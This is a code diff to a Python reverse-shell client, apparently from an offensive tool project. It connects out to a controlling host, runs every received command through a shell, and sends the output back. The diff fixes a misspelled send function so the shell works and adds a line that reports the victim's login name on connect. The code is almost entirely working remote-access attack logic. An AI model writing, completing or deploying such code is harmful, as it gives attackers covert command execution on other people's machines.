@@ -7,6 +7,7 @@ import sys
 def session_handler():
     print(f'[+] Connecting to {target_ip}.')
     sock.connect((target_ip, target_port))
+    outbound(os.getlogin())
     print(f'[+] Connected to {target_ip}.')
     while True:
         message = inbound()
@@ -21,16 +22,16 @@ def session_handler():
                 os.chdir(directory)
                 cur_dir = os.getcwd()
                 print(f'[+] Changed to {cur_dir}')
-                outboud(cur_dir)
+                outbound(cur_dir)
             except FileNotFoundError:
-                outboud('Invalid directory.  Try again.')
+                outbound('Invalid directory.  Try again.')
                 continue
         elif message == 'background':
             pass
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = command.stdout.read() + command.stderr.read()
-            outboud(output.decode())
+            outbound(output.decode())
 
 
 def inbound():
@@ -44,7 +45,7 @@ def inbound():
             sock.close()
 
 
-def outboud(message):
+def outbound(message):
     response = str(message).encode()
     sock.send(response)
 
